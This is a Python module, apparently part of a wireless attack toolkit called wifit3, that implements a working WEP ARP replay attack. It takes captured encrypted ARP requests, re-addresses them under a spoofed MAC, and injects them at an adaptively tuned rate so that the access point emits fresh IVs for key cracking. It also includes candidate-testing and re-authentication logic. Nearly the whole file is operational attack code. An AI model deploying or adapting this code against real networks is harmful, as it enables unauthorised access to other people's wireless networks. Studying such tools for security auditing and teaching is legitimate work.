"""WEP ARP replay (`aireplay-ng -3`) — the IV workhorse.

Re-injects a captured WEP-encrypted ARP request on a loop. The AP can't tell
it's a replay (WEP has no replay protection — that absence is *why* this
works), so it decrypts and rebroadcasts each one under a FRESH IV. Every
rebroadcast is a new unique IV for the cracker. This is the only attack in
the suite that actually generates IVs; fake-auth gates it and (later)
frag/chopchop only manufacture an ARP to feed it.

Only ToDS (client→AP) ARPs are usable seeds — the collector enforces that.

Candidate handling (deliberately PATIENT): the AP's rebroadcast of a good ARP
can arrive a beat after a single short burst, so judging a candidate on one
cycle falsely condemns replayable seeds. Instead each candidate gets a multi-
second trial; only a sustained absence of echoes blacklists it. "Replayable"
means the AP echoed OUR frame back — we match its rebroadcast on FromDS +
broadcast DA + SA==our MAC, the same correlation frag/chopchop use — NOT that
the global IV count happened to rise (another client's traffic must never be
mistaken for a working replay). Once the AP echoes one, we lock on and keep
replaying it. If a locked winner stalls (likely we got de-associated) we ask
fake-auth to re-auth and keep the same seed rather than discarding it.

Operating shape (deliberately SIMPLE): fixed 1-second windows. Each window we
blast ``rate`` packets at the card's full speed, then sleep out the rest of the
second (one ~1s sleep — immune to Windows' ~15ms timer granularity, unlike
per-frame pacing) while the AP's rebroadcasts land. Count IVs gained that
second, then a perturb-and-observe step nudges ``rate`` toward more IVs/s. No
per-cycle pacing math, no idle-heavy small bursts capping the duty cycle.
"""

from __future__ import annotations

import asyncio
import logging
import os
import time
from dataclasses import dataclass, field
from typing import Awaitable, Callable, List, Optional

from wifit3.engine.models import AccessPoint
from wifit3.engine.attacks import treelog

logger = logging.getLogger(__name__)

_BROADCAST = b"\xff" * 6


async def _always_associated() -> bool:
    return True


def _str_to_mac(s: str) -> bytes:
    return bytes(int(x, 16) for x in s.split(":"))


@dataclass
class ArpReplayStats:
    injected: int = 0
    cycles: int = 0
    last_gain: int = 0           # unique IVs gained in the last burst cycle
    effective_pps: float = 0.0   # injected / full cycle (incl. RX window)
    raw_pps: float = 0.0         # injected / burst-only (the hardware cap tell)
    burst_size: int = 0          # current adaptive burst size
    candidates_tried: int = 0
    candidates_failed: int = 0
    has_winner: bool = False
    started_at: float = field(default_factory=time.time)


class WepArpReplay:
    """ARP-replay loop with patient candidate testing + per-second P&O rate.

    Each 1-second window injects ``rate`` packets (one big burst at the card's
    full speed), then waits out the second. A **perturb-and-observe** step on
    ``rate`` maximizes the real objective — IVs/s (≈ IVs captured per window) —
    by stepping the rate, observing whether IVs/s rose or fell, and reversing on
    a drop. Simple, and it lets the rate climb freely toward whatever the AP can
    actually sustain (we make NO assumption about a low ceiling).
    """

    # P&O rate controller over 1s windows. Control var = pps (= packets/window);
    # objective = IVs gained that second.
    _WINDOW_S = 1.0
    _PO_STEP_PPS = 32.0
    _PO_START_PPS = 100.0
    _PO_MIN_PPS = 20.0
    _PO_MAX_PPS = 1000.0
    # Relative improvement deadband — reverse only on a real drop, so window
    # noise doesn't thrash the rate.
    _PO_IMPROVE_EPS = 0.05
    # EWMA smoothing of the per-window IVs/s before P&O acts on it. Damps the
    # queue-drain transient (lowering the rate briefly SPIKES captured IVs/s as
    # the AP's backlog flushes — raw, that fools P&O into "lower = better").
    # ~0.3 keeps a recent-weighted ~3-window memory.
    _IVS_EWMA_ALPHA = 0.3
    # How long to keep testing one candidate before judging it (seconds). The
    # AP's relayed rebroadcast can lag the burst, so don't condemn on one cycle.
    _TRIAL_WINDOW = 2.5
    # Echoes (AP rebroadcasts of our own replay) needed to call a candidate
    # replayable. 1 is definitive — only the AP relaying our frame produces one.
    _MIN_TRIAL_GAIN = 1
    # A locked winner that yields nothing for this long is probably a stale
    # association → ask fake-auth to re-auth (keep the seed) before giving up.
    _STALL_REAUTH_AFTER = 2.0
    _STALL_DEMOTE_AFTER = 6.0
    # Forgive the blacklist periodically (earlier failures may have been
    # "not associated yet" rather than "bad ARP").
    _FAILED_RETRY_COOLDOWN = 20.0

    def __init__(
        self,
        iface,
        target: AccessPoint,
        collector,
        source_mac: Optional[bytes] = None,
        ensure_associated: Optional[Callable[[], Awaitable[bool]]] = None,
        notify_activity: Optional[Callable[[], None]] = None,
        request_reauth: Optional[Callable[[], None]] = None,
        log_callback: Optional[Callable[[str], None]] = None,
    ):
        self.iface = iface
        self.target = target
        self.bssid = target.bssid
        self.bssid_bytes = _str_to_mac(target.bssid)
        # The associated STA we source replays from (the fake-auth MAC). A
        # captured ARP's encrypted body is re-addressed under this MAC.
        self.source_mac = source_mac or (bytes([0x02]) + os.urandom(5))
        self.collector = collector
        # Awaited right before a burst — authenticates lazily (returns True iff
        # associated). We only call it once we actually have an ARP to send.
        self._ensure_associated = ensure_associated or _always_associated
        self._notify_activity = notify_activity or (lambda: None)
        self._request_reauth = request_reauth or (lambda: None)
        self._log = log_callback or (lambda _m: None)

        self.stats = ArpReplayStats()
        self.state = "idle"        # idle|waiting-auth|waiting-arp|testing|replaying|paused

        self._active = False
        self._paused = False
        self._task: Optional[asyncio.Task] = None

        # P&O rate-controller state (1s windows; rate = packets/window = pps).
        self._rate = self._PO_START_PPS       # current target injection pps
        self._rate_step = self._PO_STEP_PPS   # signed perturbation
        self._po_prev_ivs_s = -1.0            # previous (smoothed) IVs/s
        self._last_ivs_s = 0.0                # this window's RAW IVs/s
        self._ivs_ewma = -1.0                 # smoothed IVs/s (what P&O acts on)

        # AP-echo correlation: _rx_cb bumps this when the AP rebroadcasts one of
        # OUR replays (FromDS + broadcast DA + SA==source_mac). The verdict keys
        # on echoes gained per trial — NOT the global IV count, which any other
        # client's traffic inflates. _burst_window snapshots + diffs it.
        self._echoes = 0

        # Candidate under test/replay + its trial accounting.
        self._current: Optional[bytes] = None
        self._winner: Optional[bytes] = None
        self._trial_gain = 0
        self._trial_started = 0.0
        self._stall_started = 0.0
        self._reauth_requested = False
        self._failed: set[bytes] = set()
        self._failed_at = 0.0

        self._last_state = ""

    # ---- Lifecycle ----------------------------------------------------------

    def start(self) -> None:
        if self._active:
            return
        self._active = True
        self.stats = ArpReplayStats()
        # Fresh P&O search each session.
        self._rate = self._PO_START_PPS
        self._rate_step = self._PO_STEP_PPS
        self._po_prev_ivs_s = -1.0
        self._ivs_ewma = -1.0
        self._echoes = 0
        # Watch for the AP echoing our replays back — the "replayable" signal.
        self.iface.register_rx_callback(self._rx_cb)
        self._task = asyncio.create_task(self._replay_loop())
        logger.info("[WEP-ARP] Replay started on %s", self.bssid)

    def stop(self) -> ArpReplayStats:
        if not self._active:
            return self.stats
        self._active = False
        self.iface.unregister_rx_callback(self._rx_cb)
        if self._task:
            self._task.cancel()
            self._task = None
        self.state = "idle"
        logger.info(
            "[WEP-ARP] Replay stopped: %d injected, %d unique IVs.",
            self.stats.injected, self.collector.unique_count(self.bssid),
        )
        return self.stats

    def pause(self) -> None:
        """Halt TX without tearing down — for the frag/chopchop sub-modes that
        need exclusive use of the radio."""
        self._paused = True

    def resume(self) -> None:
        self._paused = False

    @property
    def is_active(self) -> bool:
        return self._active

    @property
    def target_pps(self) -> float:
        """The P&O-chosen injection rate (the smooth controlled variable). Use
        this for display, NOT stats.effective_pps — the latter is the per-cycle
        MEASURED rate and jitters with USB/scheduling latency."""
        return self._rate

    # ---- Candidate selection ------------------------------------------------

    def _next_candidate(self, candidates: List[bytes]) -> Optional[bytes]:
        """First not-blacklisted candidate (winner handling is in the loop).
        Periodically forgives the blacklist."""
        if self._failed and (time.time() - self._failed_at) > self._FAILED_RETRY_COOLDOWN:
            self._failed.clear()
        for cand in candidates:
            if cand not in self._failed:
                return cand
        return None

    def _begin_trial(self, cand: bytes) -> None:
        self._current = cand
        self._trial_gain = 0
        self._trial_started = time.time()
        self._stall_started = 0.0
        self._reauth_requested = False
        if cand is not self._winner:
            self.stats.candidates_tried += 1
        # Group header (plain) — one per candidate trial; _judge closes it with a
        # └─✓ (replaying) or └─╳ (couldn't replay) leaf. The byte-count lets
        # the user see which captured lengths get tried vs. which actually
        # replay — surfaces FCS-padded / mis-classified candidates.
        self._log(
            f"[green]ARP Replay:[/green] [white]Testing candidate packet "
            f"({len(cand)} B)…[/white]"
        )

    # ---- Replay loop --------------------------------------------------------

    async def _replay_loop(self) -> None:
        try:
            while self._active:
                if self._paused:
                    self._set_state("paused")
                    await asyncio.sleep(0.2)
                    continue

                # Find an ARP to replay FIRST — only then is it worth
                # authenticating (no eager fake-auth with nothing to send).
                # A confirmed winner is replayed forever — WEP frames never
                # expire, so don't drop it just because it aged out of the
                # constantly-churning capture ring (our own replays make the AP
                # rebroadcast, flooding the ring with fresh frames). Re-picking
                # an evicted winner each cycle is what spammed the log.
                if self._winner is not None:
                    self._current = self._winner
                else:
                    candidates = self.collector.arp_candidates(self.bssid)
                    cand = self._next_candidate(candidates)
                    if cand is None:
                        self._set_state("waiting-arp")
                        await asyncio.sleep(0.3)
                        continue
                    if self._current is not cand:
                        self._begin_trial(cand)

                # We have something to send — now (lazily) associate.
                if not await self._ensure_associated():
                    self._set_state("waiting-auth")
                    await asyncio.sleep(0.3)
                    continue

                gain = await self._burst_window(self._current)
                self._trial_gain += gain
                self._judge(gain)
                self._maybe_adjust_rate()
        except asyncio.CancelledError:
            pass

    def _build_replay_frame(self, captured: bytes) -> Optional[bytes]:
        """Re-address a captured WEP ARP into a ToDS frame sourced from our
        associated MAC, reusing its (cleartext-headed) encrypted body verbatim.

        The 802.11 header is NOT encrypted, so swapping it doesn't disturb the
        IV / ciphertext / ICV — the AP decrypts the body with the same key+IV,
        sees a valid broadcast ARP from an associated STA (us), and relays it
        with a fresh IV. Works for frames captured in EITHER direction.
        """
        if len(captured) < 28:
            return None
        fc0, fc1 = captured[0], captured[1]
        hdr = 24
        if (fc1 & 0x01) and (fc1 & 0x02):    # ToDS+FromDS → 4-addr (WDS)
            hdr += 6
        if ((fc0 & 0xF0) >> 4) & 0x08:       # QoS data subtype
            hdr += 2
        if fc1 & 0x80:                       # HT Control (Order bit)
            hdr += 4
        body = captured[hdr:]                # IV(3)+KeyID(1)+ciphertext+ICV
        if len(body) < 8:
            return None
        new_hdr = (
            b"\x08\x41"                       # Data, ToDS=1, Protected=1
            + b"\x00\x00"                     # Duration
            + self.bssid_bytes                # Addr1 = BSSID (RA)
            + self.source_mac                 # Addr2 = us (associated TA/SA)
            + b"\xff\xff\xff\xff\xff\xff"     # Addr3 = broadcast (DA)
            + b"\x00\x00"                     # Seq (hardware fills)
        )
        return new_hdr + body

    # ---- Echo oracle (RX callback) ------------------------------------------

    def _rx_cb(self, frame: bytes, rssi: int, ts: float) -> None:
        """Count the AP echoing one of OUR replays — the "replayable" signal.

        Pinned signature (the same correlation frag/chopchop use): Data +
        FromDS + Protected, Addr1(DA)=broadcast, Addr3(SA)==our source_mac.
        Our own injections are ToDS (FromDS=0) so they're excluded, and a
        relayed client ARP carries the client's MAC as SA, not ours — so no
        other station's traffic can be mistaken for our replay working. Gated on
        active-and-not-paused: frag/chopchop share our source_mac, so a frag
        relay (broadcast DA too) during a pause would otherwise bleed in. Runs
        on every RX frame — keep it cheap.
        """
        if not self._active or self._paused or len(frame) < 22:
            return
        fc0, fc1 = frame[0], frame[1]
        if ((fc0 >> 2) & 0x03) != 2:            # not data
            return
        if not (fc1 & 0x40):                    # not Protected (WEP)
            return
        if not (fc1 & 0x02) or (fc1 & 0x01):    # need FromDS, not ToDS
            return
        if frame[4:10] != _BROADCAST:           # Addr1 (DA) not broadcast
            return
        if frame[16:22] != self.source_mac:     # Addr3 (SA) not us
            return
        self._echoes += 1

    async def _burst_window(self, cand: bytes) -> int:
        """One 1-second window: blast ``rate`` packets at the card's full speed,
        then sleep out the rest of the second while the AP's rebroadcasts land.
        Returns the echoes we matched as OURS this window (the verdict signal);
        the P&O objective — global IVs/s — is tracked separately in _ivs_ewma
        from the collector's IV count."""
        frame = self._build_replay_frame(cand)
        if frame is None:
            # Malformed capture — blacklist and move on.
            self._failed.add(cand)
            self._current = None
            return 0
        ivs_before = self.collector.unique_count(self.bssid)
        echoes_before = self._echoes
        t0 = time.time()
        sent = 0
        for _ in range(int(round(self._rate))):
            if not self._active:
                break
            try:
                await self.iface.send_raw(frame, use_no_ack=True)
                self.stats.injected += 1
                sent += 1
            except Exception:
                logger.exception("[WEP-ARP] send_raw failed")
                break
        send_dt = max(1e-3, time.time() - t0)   # burst only — the hardware cap
        if sent:
            self._notify_activity()   # our traffic keeps the assoc alive
        # Wait out the remainder of the 1s window (one big sleep — immune to
        # Windows' ~15ms timer granularity). If the burst overran the second
        # (rate beyond the card's reach), no sleep — the card's max IS our cap.
        await asyncio.sleep(max(0.0, self._WINDOW_S - send_dt))
        window_dt = max(1e-3, time.time() - t0)
        self.stats.cycles += 1
        self.stats.raw_pps = sent / send_dt           # card's burst speed
        self.stats.effective_pps = sent / window_dt   # over the full window
        self.stats.burst_size = sent
        gain = self.collector.unique_count(self.bssid) - ivs_before
        self.stats.last_gain = gain
        raw_ivs_s = gain / window_dt
        self._last_ivs_s = raw_ivs_s
        # EWMA so P&O reacts to the trend, not the queue-drain spike.
        a = self._IVS_EWMA_ALPHA
        self._ivs_ewma = (
            raw_ivs_s if self._ivs_ewma < 0
            else a * raw_ivs_s + (1.0 - a) * self._ivs_ewma
        )
        # The verdict keys on echoes (the AP rebroadcasting OUR frame), not the
        # IV delta — that's what keeps another client's IVs from false-promoting
        # a dud candidate. P&O still optimizes global IVs/s via _ivs_ewma above.
        return self._echoes - echoes_before

    def _judge(self, gain: int) -> None:
        """Decide what to do with the current candidate based on its trial."""
        is_winner = self._current is self._winner

        if is_winner:
            self._set_state("replaying")
            if gain > 0:
                self._stall_started = 0.0
                self._reauth_requested = False
                return
            # Winner went quiet — likely we got de-associated. Give it a grace
            # period, ask fake-auth to re-auth, and only demote if it stays dead.
            now = time.time()
            if self._stall_started == 0.0:
                self._stall_started = now
            stalled = now - self._stall_started
            if stalled > self._STALL_REAUTH_AFTER and not self._reauth_requested:
                self._reauth_requested = True
                self._request_reauth()
                self._log("[yellow]ARP replay stalled — re-authenticating[/yellow]")
            if stalled > self._STALL_DEMOTE_AFTER:
                self._winner = None
                self._current = None
                self.stats.has_winner = False
            return

        # Testing a candidate: it's replayable once the AP has echoed it at least
        # _MIN_TRIAL_GAIN times; otherwise blacklist after the trial window.
        self._set_state("testing")
        if self._trial_gain >= self._MIN_TRIAL_GAIN:
            self._winner = self._current
            self.stats.has_winner = True
            self._failed.discard(self._current)
            self._log(treelog.branch_ok(
                f"Candidate packet ({len(self._current)} B) is "
                "[bold green]replayable[/bold green]"
            ))
            self._log(treelog.leaf_ok(
                "[green]ARP Replaying now[/green] [dim](see CAPTURE)[/dim]"
            ))
        elif (time.time() - self._trial_started) >= self._TRIAL_WINDOW:
            failed_len = len(self._current)
            self._failed.add(self._current)
            self._failed_at = time.time()
            self.stats.candidates_failed = len(self._failed)
            self._current = None
            self._log(treelog.leaf_fail(
                f"[yellow]failed to replay ({failed_len} B)[/yellow] "
                "[dim](AP never echoed it)[/dim]"
            ))

    def _maybe_adjust_rate(self) -> None:
        """Perturb-and-observe step, run once per 1s window — ONLY while
        replaying a winner (else IVs/s isn't a clean function of our rate). Keep
        the perturbation's direction if the SMOOTHED (EWMA) IVs/s beat the last
        step's, else reverse; then step the rate. The rate walks toward more
        IVs/s and dithers around the peak — wherever the AP actually tops out.
        """
        if self.state != "replaying":
            # No steady signal → reset the baseline + smoothing for next time.
            self._po_prev_ivs_s = -1.0
            self._ivs_ewma = -1.0
            return
        measured = self._ivs_ewma        # smoothed IVs/s (damps queue spikes)
        if self._po_prev_ivs_s < 0:
            self._po_prev_ivs_s = measured   # first window: just set baseline
        else:
            # Reverse only on a real drop (deadband absorbs window noise).
            if measured < self._po_prev_ivs_s * (1.0 - self._PO_IMPROVE_EPS):
                self._rate_step = -self._rate_step
            self._po_prev_ivs_s = measured
        self._rate = min(
            self._PO_MAX_PPS, max(self._PO_MIN_PPS, self._rate + self._rate_step)
        )

    # ---- Logging ------------------------------------------------------------

    def _set_state(self, state: str) -> None:
        """Set the current state; log only on a real transition (no spam)."""
        self.state = state
        if state == self._last_state:
            return
        self._last_state = state
        if state == "waiting-arp":
            # We already suggested deauth/chop/frag at start — keep this terse.
            self._log("[green]ARP Replay:[/green] [white]waiting for ARP[/white]")
        # "testing" is logged per-candidate in _begin_trial (the group header) —
        # _set_state dedups, which would swallow each new candidate's header
        # after the first. waiting-auth is silent (SECURITY panel covers it).

